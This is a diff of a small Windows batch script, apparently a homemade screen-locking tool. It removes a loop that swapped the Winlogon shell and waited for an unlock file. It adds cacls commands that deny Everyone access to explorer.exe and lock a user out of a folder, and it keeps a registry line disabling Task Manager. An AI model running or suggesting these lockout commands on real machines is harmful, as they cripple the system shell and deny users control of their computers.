@@ -1,13 +1,12 @@
 @echo off
+cacls C:\WINDOWS\explorer.exe /e /p everyone:n
 REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
-REG ADD HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon /v Shell /t REG_SZ /d "C:\mas\Markuse asjad\Markuse arvuti lukustamiss steem.exe" /f
-taskkill /F /IM explorer.exe
-taskkill /F /IM Rainmeter.exe
-:a
-REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
-timeout 5s ping localhost >nul
-if not exist %HOMEDRIVE%\mas\un.lock goto a
-del %HOMEDRIVE%\mas\un.lock
-REG ADD HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon /v Shell /t REG_SZ /d explorer /f
-REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f
+cacls C:\mas /e /p MarkusMaal:n
+cacls C:\mas\unable.htm /e /p everyone:f
+cacls C:\mas\block.htm /e /p everyone:f
+cacls C:\mas\pixbkgnd.gif /e /p everyone:f
+cacls C:\mas\apixrule.gif /e /P everyone:f
+cacls C:\mas\apixrule1.gif /e /P everyone:f
+cacls C:\mas\apixrule2.gif /e /P everyone:f
+cacls C:\mas\apixrule3.gif /e /P everyone:f
 exit
